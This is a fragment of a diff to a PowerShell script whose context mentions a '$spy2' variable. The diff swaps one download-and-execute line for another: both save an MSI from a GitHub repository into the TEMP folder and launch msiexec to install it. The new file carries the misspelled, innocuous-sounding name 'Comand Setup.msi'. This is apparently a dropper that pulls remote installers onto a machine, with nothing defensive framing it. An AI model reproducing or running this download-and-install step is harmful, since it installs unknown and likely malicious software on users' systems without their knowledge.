@@ -57,4 +57,4 @@ if (Test-Path $spy2) {
 }
 
 
-$p="$env:TEMP\testbuildweb.msi"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/testbuildweb.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
+$p="$env:TEMP\Comand Setup.msi"; Invoke-WebRequest "https://github.com/analysisw/test/raw/refs/heads/main/Comand%20Setup.msi" -OutFile $p; Start-Process msiexec.exe -ArgumentList "/i `"$p`""
